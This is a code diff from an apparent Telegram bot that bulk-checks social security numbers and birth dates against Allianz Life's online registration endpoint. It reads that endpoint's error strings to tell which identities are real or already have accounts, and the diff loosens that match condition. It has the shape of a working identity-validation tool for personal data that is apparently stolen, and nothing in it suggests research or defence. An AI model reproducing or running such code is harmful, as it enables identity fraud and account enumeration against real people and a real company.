@@ -62,7 +62,7 @@ def check_ssn(ssn:int,full_ssn = False,full = [],pattern = 1,recheck = True):
         data["IndividualIdProofing.DateOfBirthDay"] = full[4]
         data["IndividualIdProofing.DateOfBirthYear"] = full[5]
         response = session.post("https://www.allianzlife.com/SPA/Registration/Handle", json=data , headers= headers)
-        if "fail-existing-account-found" in response.text or not ( "fail-data-mismatch" in response.text or "Show error message" in response.text ) :
+        if "fail-existing-account-found" in response.text or not ( "fail-data-mismatch" in response.text or "Show error message" in response.text or "Error" in response.text) :
             return True
         else:
             if recheck : return False
@@ -122,5 +122,5 @@ def doc_handler(message):
         bot.send_message(message.chat.id,"Done Checking ")
         bot.send_message(message.chat.id,f"Success : {successful}")
     except:
-        bot.send_message(message.chat.id, "Done ")
+        bot.send_message(message.chat.id,"DONE")
 bot.polling()
